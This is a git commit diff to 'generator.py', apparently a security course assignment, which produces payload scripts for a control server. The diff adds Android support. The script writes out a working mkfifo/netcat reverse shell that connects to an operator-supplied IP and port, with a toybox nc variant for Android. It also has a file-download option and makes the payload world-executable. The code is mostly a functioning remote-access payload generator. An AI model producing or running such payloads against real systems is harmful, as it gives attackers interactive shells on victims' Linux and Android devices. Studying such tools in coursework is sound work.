8f091a04a580ba94c4e7c795f21ed3cd61a6ea87
Jacques Bourquin <jacques@jacoscript.com>
2020-02-24 04:39:53 +0000

    Added ARM capability

--- Assignment1/generator.py
+++ Assignment1/generator.py
@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import argparse
 import os
 
@@ -8,7 +10,7 @@ arg_parser.add_argument("-i", action="store",
     help="Control server IP address")
 arg_parser.add_argument("-p", action="store",
     help="Control server port", default=8888)
-arg_parser.add_argument("-o", action="store",
+arg_parser.add_argument("-o", action="store", default="payload.sh",
     help="Output file")
 arg_parser.add_argument("-d", action="store",
     help="Download file <path>")
@@ -24,22 +26,24 @@ arg_parser.add_argument("-m", default="linux",
     help="Machine type: linux|android")
 arg_parser.add_argument("--ndk", help="Path to NDK")
 arg_parser.add_argument("--gcc", default="gcc",
-    help="Path to GCC")   
+    help="Path to GCC (Overridden if NDK is supplied)")   
 arg_parser.add_argument("sources", nargs="?")
 args = arg_parser.parse_args()
 
 def reverse_shell():
-    shellcode = "rm -f /tmp/f; mkfifo /tmp/f\n"
-    if args.a == "x86":
+    shellcode = 'set +e\n'
+    if args.m == "linux":
+        shellcode = shellcode + "rm -f /tmp/f; mkfifo /tmp/f\n"''
         shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "nc " + str(args.i) + " " + str(args.p) + " > /tmp/f\n"
-    elif args.a == "arm":
-        shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "toybox nc " + str(args.i) + " " + str(args.p) + " > /tmp/f"+ " > /tmp/f\n"
+    elif args.m == "android":
+        shellcode = shellcode + "rm -f /sdcard/f; mkfifo /sdcard/f\n"''
+        shellcode = shellcode + "cat /sdcard/f | /bin/sh -i 2>&1 | " + "toybox nc " + str(args.i) + " " + str(args.p) + " > /sdcard/f"+ " > /sdcard/f\n"
     else:
-        print("Invalid architecture specified")
-    f = open("payload.sh", "w")
+        print("Invalid machine type")
+    f = open(args.o, "w")
     f.write(shellcode + "\n")
     f.close()
-    os.chmod("payload.sh", 777)
+    os.chmod(args.o, int('777', base=8))
 
 if args.r:
     reverse_shell()
